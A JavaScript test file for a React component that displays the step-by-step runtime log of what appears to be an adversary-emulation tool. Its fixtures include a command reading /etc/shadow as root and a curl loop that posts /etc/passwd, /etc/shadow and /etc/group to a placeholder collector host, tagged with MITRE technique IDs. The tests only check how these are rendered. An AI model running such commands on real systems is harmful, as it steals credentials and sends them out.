/**
 * RuntimeLog — the one panel on a run's page. One block per step: state as a
 * StatusIcon and a word, the command (one line, opened in place when long),
 * the host's exit and duration, then the output.
 */
import React from 'react'
import { describe, it, expect } from 'vitest'
import { render, screen, within } from '@testing-library/react'
import RuntimeLog from '../RuntimeLog.jsx'
import { buildRuntimeLog } from '../runtimeLog.js'

void React

const LONG = [
  'for f in /etc/passwd /etc/shadow /etc/group; do',
  '  curl -fsS -X POST --data-binary @"$f" "https://collector.example.test/ingest?name=$(basename "$f")"',
  'done',
].join('\n')

const STEPS = [
  { id: 'step-01', name: 'Read the shadow file', command: 'cat /etc/shadow', identity: 'root', mitre_technique: 'T1003.008' },
  { id: 'step-02', name: 'Exfiltrate', command: LONG, identity: 'www-data', mitre_technique: 'T1041' },
]
const OUTPUT = [
  '=== STEP 1/2 · step-01 · T1003.008 · identity=root ===',
  'root:$6$abc:19000:0:99999:7:::',
  '--- exit_code=0 duration=1.2s ---',
  '=== STEP 2/2 · step-02 · T1041 · identity=www-data ===',
  '--- exit_code=0 duration=4s ---',
].join('\n')

const log = (run, steps = STEPS) => buildRuntimeLog({ steps, run })
const steps = () => screen.getAllByTestId('runtime-step')

describe('<RuntimeLog />', () => {
  it('draws a block per step with its state, account, exit and duration', () => {
    render(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} />)
    const [one, two] = steps()
    expect(within(one).getByRole('img', { name: 'Ran' })).toBeInTheDocument()
    expect(one).toHaveTextContent('01')
    expect(one).toHaveTextContent('Read the shadow file')
    expect(one).toHaveTextContent('as root')
    expect(one).toHaveTextContent('exit 0 · 1.2s')
    expect(within(one).getByTestId('runtime-step-command')).toHaveTextContent('as authored')
    // A step that ran and printed nothing says so, rather than showing a blank.
    expect(within(two).queryByTestId('runtime-step-output')).toBeNull()
    expect(two).toHaveTextContent('No output')
  })

  it('a short command is shown whole; a long one shows one line and opens in place', () => {
    render(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} />)
    const [one, two] = steps()
    expect(within(one).getByTestId('runtime-step-command').querySelector('details')).toBeNull()

    const more = within(two).getByTestId('runtime-step-command').querySelector('details')
    expect(more).not.toBeNull()
    expect(more.open).toBe(false)
    expect(more.querySelector('summary')).toHaveTextContent('for f in /etc/passwd /etc/shadow /etc/group; do')
    expect(more.querySelector('summary')).not.toHaveTextContent('curl -fsS')
    const full = more.querySelector('pre')
    expect(full.textContent).toBe(LONG)
    expect(full).not.toBeVisible()
    more.open = true
    expect(full).toBeVisible()
  })

  it("says when the command is the agent's own record of it", () => {
    const run = { status: 'complete', output: OUTPUT, step_starts: [{ step_id: 'step-01', command: 'cat /etc/shadow' }] }
    render(<RuntimeLog log={log(run)} />)
    expect(within(steps()[0]).getByTestId('runtime-step-command')).toHaveTextContent('from the agent')
  })

  it('a finished run reads Stored; a live one shows how it is being followed', () => {
    const { rerender } = render(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} />)
    const bar = () => screen.getByRole('region', { name: 'Runtime log' }).querySelector('.rtlog__bar')
    expect(within(bar()).getByRole('img', { name: 'Stored' })).toBeInTheDocument()
    rerender(<RuntimeLog log={log({ status: 'running', output: '' })} stream={{ connected: true, mode: 'stream' }} />)
    expect(within(bar()).getByRole('img', { name: 'Live' })).toBeInTheDocument()
    rerender(<RuntimeLog log={log({ status: 'running', output: '' })} stream={{ connected: true, mode: 'poll' }} />)
    expect(within(bar()).getByRole('img', { name: 'Polling' })).toBeInTheDocument()
    rerender(<RuntimeLog log={log({ status: 'complete', output: OUTPUT })} partial />)
    expect(within(bar()).getByRole('img', { name: 'Stored · last 2 KB' })).toBeInTheDocument()
  })

  it('claims nothing about a step until the run record is read', () => {
    const { rerender } = render(<RuntimeLog log={log(null)} loaded={false} />)
    expect(screen.getByTestId('runtime-log-empty')).toHaveTextContent('Loading…')
    expect(screen.queryAllByTestId('runtime-step')).toHaveLength(0)
    rerender(<RuntimeLog log={log(null)} loaded={false} failed />)
    expect(screen.getByTestId('runtime-log-empty')).toHaveTextContent('Run record not loaded')
  })

  it('a run with no steps and no output says so in one line', () => {
    render(<RuntimeLog log={log({ status: 'failed', output: '' }, [])} />)
    expect(screen.getByTestId('runtime-log-empty')).toHaveTextContent('No steps recorded')
  })

  it('keeps the lines the transcript carries outside any step, in place', () => {
    const run = { status: 'aborted', output: `!! TARGET_AGENT_OS_UNKNOWN: POSIX assumed\n${OUTPUT}\n--- ABORTED (operator) ---` }
    render(<RuntimeLog log={log(run)} />)
    const items = [...screen.getByRole('region', { name: 'Runtime log' }).querySelectorAll('.rtlog__steps > li')]
    expect(items.map((li) => li.getAttribute('data-testid'))).toEqual(
      ['runtime-note', 'runtime-step', 'runtime-step', 'runtime-note'],
    )
    expect(items[0]).toHaveTextContent('TARGET_AGENT_OS_UNKNOWN')
    expect(items[3]).toHaveTextContent('ABORTED (operator)')
  })
})
